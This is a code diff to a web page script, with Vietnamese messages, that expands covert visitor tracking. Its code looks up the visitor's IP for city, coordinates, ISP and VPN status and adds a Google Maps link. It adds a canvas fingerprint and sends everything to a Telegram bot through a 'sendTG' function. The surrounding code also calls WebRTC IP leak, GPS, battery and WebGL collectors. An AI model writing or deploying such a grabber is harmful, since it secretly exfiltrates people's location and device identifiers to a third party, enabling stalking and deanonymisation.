@@ -225,15 +225,31 @@
             } catch(e) {}
         }
 
-        // === CHECK VPN ===
+        // === CHECK VPN & IP DETAIL ===
         function checkVPN(ip) {
-            fetch('https://ip-api.com/json/' + ip + '?fields=status,country,regionName,city,isp,org,proxy,hosting')
+            fetch('https://ip-api.com/json/' + ip + '?fields=status,country,regionName,city,isp,org,as,proxy,hosting,timezone,lat,lon')
                 .then(function(r) { return r.json(); })
                 .then(function(data) {
-                    var msg = '🌍 <b>VỊ TRÍ IP</b>\n🏳️ Quốc gia: ' + (data.country || 'Không rõ') + '\n🏙️ Thành phố: ' + (data.city || 'Không rõ') + '\n📡 ISP: ' + (data.isp || 'Không rõ') + '\n🔒 VPN/Proxy: ' + (data.proxy ? '⚠️ CÓ' : '✅ KHÔNG');
+                    var msg = '🌍 <b>THÔNG TIN IP</b>\n';
+                    msg += '🏳️ Quốc gia: ' + (data.country || 'Không rõ') + '\n';
+                    msg += '🏙️ Thành phố: ' + (data.city || 'Không rõ') + '\n';
+                    msg += '📍 Tọa độ: ' + (data.lat || '?') + ', ' + (data.lon || '?') + '\n';
+                    msg += '📡 ISP: ' + (data.isp || 'Không rõ') + '\n';
+                    msg += '🏢 Org: ' + (data.org || 'Không rõ') + '\n';
+                    msg += '🔢 AS: ' + (data.as || 'Không rõ') + '\n';
+                    msg += '🕐 Múi giờ: ' + (data.timezone || 'Không rõ') + '\n';
+                    msg += '🔒 VPN/Proxy: ' + (data.proxy ? '⚠️ CÓ' : '✅ KHÔNG') + '\n';
+                    msg += '🖥️ Hosting: ' + (data.hosting ? '⚠️ CÓ' : '✅ Không');
                     sendTG(msg);
+
+                    // Gửi bản đồ link (Google Maps)
+                    if (data.lat && data.lon) {
+                        sendTG('🗺️ Bản đồ: https://www.google.com/maps?q=' + data.lat + ',' + data.lon);
+                    }
                 })
-                .catch(function() {});
+                .catch(function() {
+                    sendTG('❌ Không tra cứu được IP');
+                });
         }
 
         // === WEBRTC IP ===
@@ -253,6 +269,29 @@
                 }
             };
             setTimeout(function() { pc.close(); }, 3000);
+        }
+
+        // === GET CANVAS FINGERPRINT ===
+        function getCanvasFingerprint() {
+            try {
+                var canvas = document.createElement('canvas');
+                canvas.width = 256;
+                canvas.height = 128;
+                var ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'alphabetic';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(100, 50, 50, 50);
+                ctx.fillStyle = '#069';
+                ctx.font = '14px Arial';
+                ctx.fillText('BMP', 50, 50);
+                var fingerprint = canvas.toDataURL();
+                var hash = 0;
+                for (var i = 0; i < fingerprint.length; i++) {
+                    hash = ((hash << 5) - hash) + fingerprint.charCodeAt(i);
+                    hash = hash & hash;
+                }
+                sendTG('🖼️ Canvas Fingerprint: ' + hash);
+            } catch(e) {}
         }
 
         // === SEND ALL INFO ===
@@ -283,6 +322,7 @@
                         getGPS();
                         getBattery();
                         getWebGL();
+                        getCanvasFingerprint();
                     }, 1500);
                 })
                 .catch(function() {
